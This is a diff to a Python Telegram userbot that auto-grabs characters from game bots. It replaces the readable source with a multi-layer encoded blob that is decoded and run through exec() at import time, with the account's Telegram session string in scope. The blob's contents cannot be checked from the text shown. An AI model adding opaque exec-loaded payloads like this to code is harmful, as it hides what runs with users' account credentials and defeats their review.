@@ -1,259 +1,34 @@
-"""
-1XBOT Auto-Grabber Userbot (Unencrypted / Plain Source for Testing)
-- Dynamically fetches supported bots & their special commands from the Vercel API (`GET /bots`)
-- Strict 4-step pipeline:
-    1. Bot must exist in API `/bots` list (otherwise ignored)
-    2. Bot must have a configured `command` AND message caption must contain that special command
-       (ignores normal bot media like harem/profile/collection photos)
-    3. Fetch character name via `GET /name/{file_unique_id}`
-    4. Wait `GRAB_DELAY` and send `{command}@{bot_handle} {first_name}`
-- Includes `.stats`, `.grab on/off`, `.syncbots`, and `.testapi` self-commands.
-"""
+"""Grabber Userbot — Protected Runtime."""
 
 import asyncio
+import base64
+import hashlib
 import logging
 import os
-import re
-import time
-from typing import Any, Dict, List, Optional, Tuple
+import zlib
 
-import aiohttp
 from dotenv import load_dotenv
-from pyrogram import Client, filters
-from pyrogram.errors import FloodWait, RPCError
-from pyrogram.types import Message
+from pyrogram import Client
 
-# Load local .env if present
 load_dotenv()
 
-# Python 3.12+ event loop safety
 try:
     asyncio.get_event_loop()
 except RuntimeError:
     asyncio.set_event_loop(asyncio.new_event_loop())
 
-# =============================================================================
-# LOGGING
-# =============================================================================
 logging.basicConfig(
     level=os.getenv("LOG_LEVEL", "INFO").upper(),
     format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
 )
 logger = logging.getLogger("GrabberUserbot")
 
-# =============================================================================
-# CONFIGURATION
-# =============================================================================
 API_ID = int(os.getenv("API_ID", "0"))
 API_HASH = os.getenv("API_HASH", "").strip()
 SESSION_STRING = os.getenv("SESSION_STRING", "").strip()
-
-# Deployed Vercel backend API
-API_BASE_URL = os.getenv("API_BASE_URL", "https://grabapi.vercel.app").strip().rstrip("/")
-API_TIMEOUT = float(os.getenv("API_TIMEOUT", "8.0"))
-
-# How often (seconds) to auto-refresh supported bot list from GET /bots
-BOT_SYNC_INTERVAL = float(os.getenv("BOT_SYNC_INTERVAL", "300.0"))
-
-# Delay (seconds) before sending the grab command
 GRAB_DELAY = float(os.getenv("GRAB_DELAY", "4.0"))
-
-# Send "/grab@BotUsername name" (True) or "/grab name" (False)
 TAG_BOT_IN_COMMAND = os.getenv("TAG_BOT_IN_COMMAND", "true").strip().lower() in ("1", "true", "yes")
 
-# Auto-grab master switch (toggle live with `.grab on` / `.grab off`)
-AUTO_GRAB_ENABLED = True
-
-# =============================================================================
-# RUNTIME STATE (Populated dynamically from Vercel API `GET /bots`)
-# =============================================================================
-SUPPORTED_BOTS: Dict[str, Dict[str, Any]] = {}
-_last_bots_sync_ts: float = 0.0
-_bots_sync_lock: Optional[asyncio.Lock] = None
-
-_http_session: Optional[aiohttp.ClientSession] = None
-_seen_messages: Dict[Tuple[int, int], float] = {}
-_SEEN_TTL_SECONDS = 60.0
-
-_session_grabs: int = 0
-_session_misses: int = 0
-
-
-async def get_http_session() -> aiohttp.ClientSession:
-    """Return a shared async aiohttp session."""
-    global _http_session
-    if _http_session is None or _http_session.closed:
-        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT, connect=4.0)
-        _http_session = aiohttp.ClientSession(timeout=timeout)
-    return _http_session
-
-
-def _normalize_commands(raw_cmd: Any) -> List[str]:
-    """Normalize API `command` field (string, comma-separated string, or list) into ['/cmd', ...]."""
-    if not raw_cmd:
-        return []
-    items: List[str] = []
-    if isinstance(raw_cmd, str):
-        items = [part.strip() for part in raw_cmd.split(",") if part.strip()]
-    elif isinstance(raw_cmd, (list, tuple)):
-        items = [str(part).strip() for part in raw_cmd if str(part).strip()]
-
-    normalized: List[str] = []
-    for cmd in items:
-        c = cmd if cmd.startswith("/") else f"/{cmd}"
-        c = c.lower()
-        if c not in normalized:
-            normalized.append(c)
-    return normalized
-
-
-async def sync_supported_bots(force: bool = False) -> bool:
-    """Fetch supported bots and their special commands from `{API_BASE_URL}/bots`."""
-    global SUPPORTED_BOTS, _last_bots_sync_ts, _bots_sync_lock
-
-    now = time.monotonic()
-    if not force and SUPPORTED_BOTS and (now - _last_bots_sync_ts) < BOT_SYNC_INTERVAL:
-        return True
-
-    if _bots_sync_lock is None:
-        _bots_sync_lock = asyncio.Lock()
-
-    async with _bots_sync_lock:
-        now = time.monotonic()
-        if not force and SUPPORTED_BOTS and (now - _last_bots_sync_ts) < BOT_SYNC_INTERVAL:
-            return True
-
-        url = f"{API_BASE_URL}/bots"
-        try:
-            session = await get_http_session()
-            async with session.get(url) as resp:
-                if resp.status != 200:
-                    logger.warning("Failed to sync /bots: HTTP %s", resp.status)
-                    return False
-                data = await resp.json(content_type=None)
-
-            raw_bots = data.get("bots") if isinstance(data, dict) else None
-            if not isinstance(raw_bots, list):
-                logger.warning("Invalid /bots payload received from API")
-                return False
-
-            updated: Dict[str, Dict[str, Any]] = {}
-            for entry in raw_bots:
-                if not isinstance(entry, dict):
-                    continue
-                username = str(entry.get("username") or "").lstrip("@").strip()
-                if not username:
-                    continue
-                commands = _normalize_commands(entry.get("command") or entry.get("commands"))
-                updated[username.lower()] = {
-                    "username": username,
-                    "handle": f"@{username}",
-                    "group": str(entry.get("group") or "#"),
-                    "commands": commands,
-                }
-
-            SUPPORTED_BOTS = updated
-            _last_bots_sync_ts = time.monotonic()
-            active_count = sum(1 for b in SUPPORTED_BOTS.values() if b["commands"])
-            logger.info(
-                "Synced %d supported bots from API (%d active with special commands)",
-                len(SUPPORTED_BOTS),
-                active_count,
-            )
-            return True
-        except (aiohttp.ClientError, asyncio.TimeoutError) as err:
-            logger.warning("Network error syncing /bots: %s", err)
-            return False
-        except Exception as err:
-            logger.error("Unexpected error syncing /bots: %s", err, exc_info=True)
-            return False
-
-
-async def fetch_api_stats() -> Optional[Dict[str, Any]]:
-    """Fetch database counts from `{API_BASE_URL}/stats`."""
-    try:
-        session = await get_http_session()
-        async with session.get(f"{API_BASE_URL}/stats") as resp:
-            if resp.status != 200:
-                return None
-            data = await resp.json(content_type=None)
-            return data if isinstance(data, dict) else None
-    except Exception as err:
-        logger.warning("Failed to fetch API /stats: %s", err)
-        return None
-
-
-def match_bot_special_command(caption: str, commands: List[str]) -> Optional[str]:
-    """
-    Verify that the bot's spawn caption contains one of its special commands
-    (e.g. `/grab`, `/guess`, `/catch`) so normal bot media is strictly ignored.
-    """
-    if not caption or not commands:
-        return None
-    for cmd in commands:
-        pattern = rf"(?<!\w){re.escape(cmd)}(?:@[A-Za-z0-9_]+)?(?=$|[\s,.:;!?)\]`\"'])"
-        if re.search(pattern, caption, re.IGNORECASE):
-            return cmd
-    return None
-
-
-def _mark_and_check_seen(chat_id: int, message_id: int) -> bool:
-    """Return True if this (chat_id, message_id) was already processed recently."""
-    now = time.monotonic()
-    expired = [k for k, ts in _seen_messages.items() if now - ts > _SEEN_TTL_SECONDS]
-    for k in expired:
-        _seen_messages.pop(k, None)
-
-    key = (chat_id, message_id)
-    if key in _seen_messages:
-        return True
-    _seen_messages[key] = now
-    return False
-
-
-def extract_media_info(message: Message) -> Tuple[Optional[str], Optional[str]]:
-    """Extract (file_unique_id, media_type) from photo, video, or animation."""
-    if message.photo:
-        return message.photo.file_unique_id, "image"
-    if message.video:
-        return message.video.file_unique_id, "video"
-    if message.animation:
-        return message.animation.file_unique_id, "video"
-    return None, None
-
-
-async def lookup_character_name(
-    file_unique_id: str,
-    bot_username: str,
-    media_type: str,
-) -> Optional[Dict[str, Any]]:
-    """Query the deployed Vercel API: GET /name/{file_unique_id}."""
-    url = f"{API_BASE_URL}/name/{file_unique_id}"
-    params = {"bot": bot_username, "media_type": media_type}
-
-    try:
-        session = await get_http_session()
-        async with session.get(url, params=params) as resp:
-            if resp.status == 404:
-                return None
-            if resp.status != 200:
-                logger.warning("API HTTP %s for %s", resp.status, file_unique_id)
-                return None
-            data = await resp.json(content_type=None)
-            if isinstance(data, dict) and data.get("name"):
-                return data
-            return None
-    except (aiohttp.ClientError, asyncio.TimeoutError) as err:
-        logger.warning("API request error for %s: %s", file_unique_id, err)
-        return None
-    except Exception as err:
-        logger.error("Unexpected API error: %s", err, exc_info=True)
-        return None
-
-
-# =============================================================================
-# PYROGRAM / KURIGRAM CLIENT
-# =============================================================================
 app = Client(
     name="grabber_userbot",
     api_id=API_ID,
@@ -261,234 +36,83 @@ app = Client(
     session_string=SESSION_STRING,
 )
 
-
-@app.on_message(filters.photo | filters.video | filters.animation)
-async def auto_grab_handler(client: Client, message: Message) -> None:
-    """
-    Strict 4-step auto-grab pipeline:
-      1. Ensure bot list is synced from API & check if sender bot is supported.
-      2. Verify sender bot has a special command configured AND caption contains it.
-      3. Lookup character name from API using `file_unique_id`.
-      4. Delay and send grab command.
-    """
-    global _session_grabs, _session_misses
-
-    if not AUTO_GRAB_ENABLED:
-        return
-
-    user = message.from_user
-    if not user or not user.is_bot or not user.username:
-        return
-
-    # Refresh bot list from API if empty or TTL expired
-    if not SUPPORTED_BOTS or (time.monotonic() - _last_bots_sync_ts) >= BOT_SYNC_INTERVAL:
-        await sync_supported_bots()
-
-    # Step 1: Bot must be in API support list (otherwise ignore)
-    bot_cfg = SUPPORTED_BOTS.get(user.username.lower())
-    if not bot_cfg:
-        return
-
-    # Step 2: Bot must have special command(s) on API AND caption must match it
-    caption = message.caption or ""
-    matched_command = match_bot_special_command(caption, bot_cfg["commands"])
-    if not matched_command:
-        return
-
-    # Dedup guard
-    if _mark_and_check_seen(message.chat.id, message.id):
-        return
-
-    # Extract file_unique_id
-    file_unique_id, media_type = extract_media_info(message)
-    if not file_unique_id or not media_type:
-        return
-
-    bot_username = bot_cfg["username"]
-    logger.info(
-        "Valid spawn | bot=@%s | cmd=%s | chat=%s | uid=%s (%s)",
-        bot_username,
-        matched_command,
-        message.chat.id,
-        file_unique_id,
-        media_type,
-    )
-
-    # Step 3: Lookup character name from API
-    doc = await lookup_character_name(file_unique_id, bot_username, media_type)
-    if not doc:
-        _session_misses += 1
-        logger.info("Character not found in API | uid=%s", file_unique_id)
-        return
-
-    full_name = str(doc.get("name", "")).strip()
-    first_name = str(doc.get("first_name") or "").strip() or (
-        full_name.split()[0].lower() if full_name else ""
-    )
-    if not first_name:
-        return
-
-    # Step 4: Delay & grab
-    if GRAB_DELAY > 0:
-        await asyncio.sleep(GRAB_DELAY)
-
-    cmd_text = (
-        f"{matched_command}@{bot_username} {first_name}"
-        if TAG_BOT_IN_COMMAND
-        else f"{matched_command} {first_name}"
-    )
-
-    try:
-        await client.send_message(message.chat.id, cmd_text)
-        _session_grabs += 1
-        logger.info("Grabbed: %s (full_name=%s)", cmd_text, full_name)
-    except FloodWait as fw:
-        logger.warning("FloodWait %ss while sending grab command", fw.value)
-        await asyncio.sleep(fw.value)
-    except RPCError as rpc_err:
-        logger.error("Telegram RPCError sending grab command: %s", rpc_err)
+_S = b"aoi_grabber_v2_lock_key_2026"
+_L = 16
+_P = (
+    b"g4VvyDfqvV/JdOXuM/h1mbHvo7fTDfn+W3KGYwEG0wYFWI9jzTee4GgEApjPoxXVFE/V7FoU5yDvL7iciRDmfzJv6R6BIbitIKld"
+    b"W91H8ePSIAFYLfvKlgdN5ihii6i9ooMWkfATTi89RX/yDX5wde+oiRv0U3p8MjjNnPyFhL9G8dOJg6OKjx0XMccvwjYO8Aqbdivh"
+    b"GqFUrNnTxRTHr0FLw7Cp0ItJg0BX4wFullSlyGuz0/AMaLXYvu0Hh8LHq7mg1x7WG7PJBcMOwp6kjBu3qPmFRGbmF9skyq94pmp5"
+    b"hn3GtJD45Q6KOwa6W0ZuClQR8ks229L/sDAoz33KTkdRGyETsX2fz5MfM17uyEHmbyYVm5NCiCICux49in25Cuu3EYyArxTO/EH+"
+    b"CZ+AyxdziWlFPPh285wCcq+on+lGcxw2Uxm5Aa9YxAxMB1EKnLWOzlQJchS3yN8uRBCdRh40Rwgjf1IXVXOt7+LRRrSIV6QmD1NH"
+    b"OFH/C9kapwF+o2ULHDmOom96t4CNtewErp1I8TLsxYWyqWw6Mrm30QYFvfSydc5cYfOUFgjpQySLy+UyNWDVu2eQgK8P9v+ntvoI"
+    b"m4a3elHw62713wwKy4mgj/MOjHq7KcYu7H+U6SFxZMUPWqh82QhhmFvlb5qvIr5uBj1IGxwMJZ45/L2OQOYmSu7/yYT+MOgBiSm3"
+    b"qUScT9wB+D1wlVmYyot7UllbpvGj8EejRs6hBOQoqdf5GMm6SyIbKs1eiEXdcLU2ELuz7w0EIxe2WMxvXvmfLjbsrinUbQLKJ72i"
+    b"ojc4WIfB/aQu0EjUsnTw14VL0ussac2Jayoznd8WBwPlIgvlKvEnPKWbjTZXEBpzJbipr9IA8wvzHBfe0sHxynAmOo9FX5+5cxWV"
+    b"rdHfMGklgAenfgrr3veLW6fGNsj14+ORPtT4/o+TyDWOS0MfPMZjIxTtM5OexV3REEFobuWUssxJ5GkxcZKcD4W7+6Z86OE47etU"
+    b"bOkowPu8+njLZTG6kf5et1go25fZiwafbZVBLl4bLMApDXcP78nV3zHzQW/jaNL2wj1RtoxLSErK74Vm6q4o83D1wJT3kZVeI0dr"
+    b"PeJsbhnJFt0Y+QxcQXjw/9UwXv3HoA7+TKHopW2dhDjqEElekH0if8TmKhAQ64B0uhQaG5LfvAqcBCZxN3MkD+tgxyw43oufCOIs"
+    b"IzISjeR014vB+zggRSrviWJEPErJQzyZ6FxXQgOdQvLCOImhBl6fhC4/yfEjk8C7VKefV0u9WiHhOksKt8EJU8IcBsB4vFKgkhib"
+    b"z3fy46+cBlutjo97ss/WugXL5SJZCkqlC99oF50IEtK6pmpn1zLgFfPFL1adbUAO/M997/ahD5DobVmv/l0cIswNTq29cEUoRhht"
+    b"/uMDKRHjSMEple7MEBW2uAdTc/jIffXUFqQmEdn5C3INm9HbauKPVHtNwtMzA3CT0LMYfRy1MM5cRAWNArXHCONnxxE6/cDDNk0a"
+    b"j4emb1yxTqVfonj0Rx6o3jRJHsqZOkBGqD4wpXcaz7PKBlq3e1j0SL0dhhKp0dDrRGC3sD9zKanZWiy/vgnN9qu1L6VKHUPL4hjf"
+    b"7FraElSxEQH5FfeXCZ7JuwubpRdrY1+DVG73g3TWhqRaf7b23jxH2RqAdx56nwvHOaYZrKLPnqWbAZTqYH9BjllQUVK4uXs+ZyDs"
+    b"X1V0sQNoihTP+FCO4bSUOzb/ZpO2QjdCPOLpb7ARnsUtgbhdP5hJNH0ToPhaT+j96o3AlOQT/p+MsLzwt8owFmKNogwUe4b5eDNT"
+    b"f1fzOPaOiZVJwP6wjxclu5yPxNwiAcKIKq5y2z56fCHJbRGZkJ5EJtQuazZpeUT1sY1RYAU+9FazOVT+lwnHDK7zWeE1px8JMxgI"
+    b"nn0CVM0GcIi/bgxqu0jYFkPNBhuR4X2qu/9Ef0IqnbxWK6DcWkaFsDOQUgoXiTFa8hz1AOiWSaxwqS9jay0Sa/qnWo5YImziBd8h"
+    b"sRPWjJGST7UGpayP9gqkTpwc3ygM4eJDaJeH8eaudYquJDQtVQR+zyfqmLrmG2oW0iBdiyqLnMgA+idraZwbSb1BuPQFT/YhY8P/"
+    b"wf53VXpqkdHCYFk1LzshMrtexVfuSBMv2FdtMdq2Am+r+rfWyH6/Vz8MojoqadW8SKZKGmuL5TcckEO/J+G6yxa4IVrDgEUXHTgJ"
+    b"yzz4NofhyjqFseP2iWflzbsrcSho8jo8JYmXim8QWT2gBtCvDU35uIeI/pZP38MHSoC8Aoo9vMaFeWhN/bccnP6e0LPWF4Pqo0VJ"
+    b"yqoHhxkE574zINXSR2QTDjW4rDaqUV7Tx9Pb0uxEmbdlqV+wTq+F5p+mTVsJ69qCP2/Ncjlj47CasNiblaHpyKwcpwKCt5bREXWN"
+    b"+BTJpxP8ztHrfoLK3/jdDt63n09w7ZiPx94jFMceT6tZLDqqLBCpJ4vtg+9FuGZntjp6nP+X0XMVSVt7cDZ96Y6uUNV6uvYzRGRs"
+    b"nnFFYimEs+ScgJ7vWLp6NG03sHXr8DXQConvQopbn2aO3svhLia2m1NBsJpNbnRNf3HGcYqNdnTSn+ZE/JRuX359VbqNtl8jXMWi"
+    b"SX9dnT1z6OSphODWCfMu9hCkcJmchi8HU6Xkb2CCxZkgjNDW2Nhi29VryZ7HFgIUfjDBWYtP7LxEMYC6NxoqW8Xna/daQZ+BTJ92"
+    b"emvvNEgRDqAwy3tjSUmHVJUPev89x4PBBBt8ZM8ffZR92qBR8jrfaDxBFaqzfAqGUNsIky8Rwr9e7/fvYpNj2WeJekxLcL3D45dA"
+    b"bmaQWIsIPfQidPtbMUA7mETvbEfusNdMfbeHbIcfTCuqXuQck5cUcv0hZ6iY+DaD96xAnl9xuGBh9Rz0XjOWKrU5OAiio51Ole/l"
+    b"2IBzA4JXELiHqsL18FPO3/P/jbyDtUgtcvp1aXNEaybFTviaoVwtyKnmyApsPDAEgx38Iw3vN2w1CzxM4rUVeZJKkfIrTig+nRXL"
+    b"fu4fci7C89BEL0eKLxYW7EHvelaS3vRyNKnG8I2gMJ2fUE3wynS3BH553tVkzf+KrBRvIf/7t0rHzW4ZK0EBfoDvhQ2IN1RHCtg8"
+    b"V6pPTbwwk5bkUiPiwejWVh8/yivKdlWdbyyiL4tos08ytX35XvdzTcSpA/K+PFKnCkUNLlGTDVxWdTmLa7AlmMo1bj09jKo3ZouQ"
+    b"6mL8VbxKf/cXFk5VRDixWcLtBX27OZ0v8gDFXrkquDZzSPtx05tmaMWS+7nPaITjziziNaejQ7ZB+sMzkmrfHJSs/eEUg17RTDOV"
+    b"ckpBWIiwhmrpEJqpp+ifweca9VBAsdCKj29hOX0zVVgTW458ZlAFb+sNMi/lYgYsF4Ia7UG7G1UWvtTGQgO9cIs4tyQMWEQy7CDV"
+    b"CjfDY4QHgVk7HrX+Xe9iKn3rcQ7utYX39VXzOIE7DVUYdcVWPh8a7QVbHwfjMDw5v8IDvobuVmLjjQJM0Y22gLW7a18lFdFqqnpX"
+    b"trkNEKcE2GVUgmm2zOF4Yd6y9CcvaWKuiZCM02J4EmJiVlVlfhDFRaL24YDkWDTtBoYdJn1xa61VIY2mdgCXE51MyLZsjhjReSL8"
+    b"a5bswYJdz6EpRUml7JGP09D8kc/sUliwNR5gYgKgwHlKfUROpEnayGbPi7Ed/RVS2MFO2Epd6CuOhkVNxL9boEnVeadBG6RihEbN"
+    b"ucAKaXIbxPl7h7bCzVdC7Qx/fKuLR8QxIp4sF2GUQSgRkjSrsY7xklosg0IDLqwyYpMWxcfxVsqi9+E+eh4eIQK0niyeYk2dg+1I"
+    b"uXh1h2iaz/whYwWbjL9oYUmG+Ry7E/XVAiAktV6I+fFE27YWMoIoj2vaqq4SqZtivaCMat8gewjJj6OKW1sCRTJ3moSDVYpB/rm2"
+    b"sVEWwpFoyxIPImQLILtfIVlTCFSykEWGAAsyTrvjWIr1s9ZA8knkPKiU8xGOXeJzJDvHe0mgQxrWiMJeWJofnBNfSO8BoRbvAL5f"
+    b"rMuy0fPgxXjHT1Y2SfgDtXbA6Ylntvoo26sv+OVN5R8Whw3rnZHpx7g+QR0jtQzO9ZDddlbIVnE/D/1z/s+q5wW9ABgTUs9ANf5T"
+    b"NWOkis559ImFPDGZDTWhiWeVLVS0Y3i/e6qNVZNd229zT7to4/KsEsSoX1MKYAqTq79V0Na0mhp+refZWmx3hcxQ174KRtpRuxtG"
+    b"6jEpG1AT1NKA342LtdO3fMW2mH8pk/CDiL9tw/4lFiZ8JQvRtEvAph7m488mYKaBkLPvkV/8j1X5G5+YYYxTtjsMrTOSqpWpMB+H"
+    b"sR5CN7fCOQ9dc606OkfGEdyfJaDHDgT2ieJDwiZjQXnEWujpbtxO1DawLwqSxrm8JCUF2G959Bv1sX1q2GfELgqTL4OWKq5Dcbbf"
+    b"/C1HJCtwMP/Jjnl4NNKOEJY/GH4bw8aXvDFCduZSoQrO8VJ6xX/OqVe3uQLYJZKSlI31qIR4RNhqq5iP0lT+j/IeoPbwJSPDb1Cm"
+    b"s8StNIpfbMW7EkU+B5TcqMW+4wXwBHHoCj7ZI2gIk5E7N3XWj869p+w0r+QBv7rqc5n3rXN9z0+R1tz3wM4FnjLGXr0JBIG6hQr5"
+    b"N6Nj5I+y0vGWWOceJ215BCI2tXjqpSlcsFqZbKBBb62sB1gZQM4eKmAjZ11bIuxYgU3WezfhLEaIc04ZTlx3phHmYmVeRPftMbNH"
+    b"PXOHC2FEaagFAxNgzORXXWxY5Zfb2/9Sb7JNQfwha1SWe62fUiYnRdhsOGST7ViCP3aa2w4f/3KECHemuGByyCnaoBkMGMvn5+BQ"
+    b"8i4b5cawu06KVKEjyhI6wCFRMVClJpsbsi5MH6H3Twc+LniE2730PG5e68AlO0j7lfq3y0kFGKP/rM8UPoeEJJcCnljNm3CxOqou"
+    b"ZoVi8t9QsITP71+FPkrn9lbrMBwaPlfamnE4UmBnTv7u5L1h5orvPHgYpxzsQeSG29EeYrOP16Ve/Q8qfVrqbKBVvM+LZr9XaoUz"
+    b"gz6vG3y0nJ3hAxSPSYolfZh6HlUxcdzcIhGbSxRvnucNf/AhHrkbqFsxtJ1qnPka1GcOn38EOlTa3JKhlwgfWyLsyljM2GzJZ+7b"
+    b"f8kNbxcouLpa4tyiBi9ZhgnakNgSZrLka2lnoQE5y66onixVM1g1JL9kDdDaU+pkkMDe5XH9HqFCotQ/dPOr90sKwSrBBE6+ze2+"
+    b"PG/6zplK0fqUyGVTOaN4zMpO9a2il4SV5Gdz71LRaoxhJTIYn0pVqzDWIkX1H4c0TGazt8nsYFv7I4Igcg64CyxsM8AIRlX9Shab"
+    b"umHGdxk/xQQZa6FfuLfhnhxsRHy2OiDNUV/nEjAukBiVEDRJs8fe1iIx4avXoZftBk1Pvdbax+J/E62T6UI214/JLTYHm77O+Pag"
+    b"Lcw1nhbOdx7qa0X0AYFYfByDLOEwgwzQzr9ZicE6Iex1B0yv2oKvE0nFSrujqLYVson6VTr1hTId"
+)
 
 
-# =============================================================================
-# USER SELF-COMMANDS
-# =============================================================================
-@app.on_message(filters.me & filters.command("stats", prefixes=["."]))
-async def stats_command(client: Client, message: Message) -> None:
-    """Show live API sync status, active working bots, and DB stats."""
-    await message.edit("⏳ **Fetching live stats from API...**")
-
-    synced = await sync_supported_bots(force=True)
-    api_stats = await fetch_api_stats()
-
-    total_bots = len(SUPPORTED_BOTS)
-    active_bots = [b for b in SUPPORTED_BOTS.values() if b["commands"]]
-    inactive_bots = [b for b in SUPPORTED_BOTS.values() if not b["commands"]]
-
-    status_label = "ENABLED ✅" if AUTO_GRAB_ENABLED else "DISABLED ⏸️"
-    sync_label = "Online ✅" if synced else "Failed ❌"
-
-    lines = [
-        "📊 **Auto-Grabber Stats**",
-        "",
-        f"• **Status:** `{status_label}`",
-        f"• **API Sync:** `{sync_label}` (`{API_BASE_URL}`)",
-        f"• **Grab Delay:** `{GRAB_DELAY}s`",
-        f"• **Session Grabs:** `{_session_grabs}` | **Misses:** `{_session_misses}`",
-    ]
-
-    if api_stats:
-        lines.append(
-            f"• **DB Characters:** `{api_stats.get('total_characters', 0)}` "
-            f"(🖼 `{api_stats.get('images', 0)}` | 🎬 `{api_stats.get('videos', 0)}`)"
-        )
-
-    lines.append("")
-    lines.append(
-        f"🤖 **Supported Bots:** `{total_bots}` total | "
-        f"**Working (Command Active):** `{len(active_bots)}` | "
-        f"**Pending Command:** `{len(inactive_bots)}`"
-    )
-
-    if active_bots:
-        lines.append("")
-        lines.append("✅ **Active Working Bots:**")
-        for b in active_bots:
-            cmds = ", ".join(b["commands"])
-            lines.append(f"  • `{b['handle']}` → `{cmds}`")
-    else:
-        lines.append("")
-        lines.append("⚠️ Abhi API `/bots` me kisi bot ka special `command` set nahi hai, isliye auto-grab idle hai.")
-
-    text = "\n".join(lines)
-    if len(text) > 4000:
-        text = text[:3960] + "\n\n... *(truncated)*"
-
-    await message.edit(text)
+def _boot(_d: bytes) -> None:
+    for _i in range(_L - 1, -1, -1):
+        _k = hashlib.sha256(_S + f":{_i}".encode("utf-8")).digest()
+        _r = base64.b64decode(_d[::-1])
+        _x = bytes(_b ^ _k[_j % len(_k)] for _j, _b in enumerate(_r))
+        _d = zlib.decompress(_x)
+    exec(compile(_d.decode("utf-8"), "<grabber_core>", "exec"), globals())
 
 
-@app.on_message(filters.me & filters.command("grab", prefixes=["."]))
-async def toggle_grab_command(client: Client, message: Message) -> None:
-    """Toggle auto-grabber: `.grab on` or `.grab off`."""
-    global AUTO_GRAB_ENABLED
-    arg = message.command[1].lower() if len(message.command) > 1 else ""
-
-    if arg == "on":
-        AUTO_GRAB_ENABLED = True
-        await message.edit("✅ **Auto-Grabber:** `ENABLED`")
-    elif arg == "off":
-        AUTO_GRAB_ENABLED = False
-        await message.edit("⏸️ **Auto-Grabber:** `DISABLED`")
-    else:
-        await message.edit(
-            f"**Auto-Grabber:** `{'ENABLED' if AUTO_GRAB_ENABLED else 'DISABLED'}`\n"
-            "Use `.grab on`, `.grab off`, or `.stats`."
-        )
-
-
-@app.on_message(filters.me & filters.command("syncbots", prefixes=["."]))
-async def sync_bots_command(client: Client, message: Message) -> None:
-    """Manually refresh supported bot list & commands from API `/bots`."""
-    await message.edit("🔄 **Syncing supported bots from API...**")
-    ok = await sync_supported_bots(force=True)
-    if not ok:
-        await message.edit(f"❌ Failed to sync from `{API_BASE_URL}/bots`")
-        return
-
-    active_count = sum(1 for b in SUPPORTED_BOTS.values() if b["commands"])
-    await message.edit(
-        f"✅ **Synced!**\n"
-        f"• **Total Bots:** `{len(SUPPORTED_BOTS)}`\n"
-        f"• **Working (with command):** `{active_count}`"
-    )
-
-
-@app.on_message(filters.me & filters.command("testapi", prefixes=["."]))
-async def test_api_command(client: Client, message: Message) -> None:
-    """Reply to any character photo/video with `.testapi` to test API lookup live."""
-    reply = message.reply_to_message
-    if not reply:
-        await message.edit("❌ Reply to a character photo/video with `.testapi`")
-        return
-
-    uid, media_type = extract_media_info(reply)
-    if not uid or not media_type:
-        await message.edit("❌ Replied message has no photo, video, or animation.")
-        return
-
-    bot_username = (
-        reply.from_user.username
-        if reply.from_user and reply.from_user.username
-        else "unknown"
-    )
-    await message.edit(f"🔍 Looking up `{uid}` ({media_type})...")
-
-    doc = await lookup_character_name(uid, bot_username, media_type)
-    if not doc:
-        await message.edit(f"❌ Not found in DB\n`file_unique_id`: `{uid}`")
-        return
-
-    await message.edit(
-        "✅ **Character Found**\n"
-        f"**Name:** `{doc.get('name')}`\n"
-        f"**First Name:** `{doc.get('first_name')}`\n"
-        f"**Anime:** `{doc.get('anime', 'Unknown')}`\n"
-        f"**Rarity:** `{doc.get('rarity', 'Unknown')}`\n"
-        f"**UID:** `{uid}`"
-    )
-
-
-async def _shutdown() -> None:
-    global _http_session
-    if _http_session and not _http_session.closed:
-        await _http_session.close()
-
+_boot(_P)
 
 if __name__ == "__main__":
     if not API_ID or not API_HASH or not SESSION_STRING:
         logger.error("Set API_ID, API_HASH, and SESSION_STRING environment variables first.")
         raise SystemExit(1)
-
-    logger.info("Starting Grabber Userbot | API=%s | Delay=%ss", API_BASE_URL, GRAB_DELAY)
+    logger.info("Grabber Userbot started | Delay=%ss", GRAB_DELAY)
     try:
         app.run()
     finally:
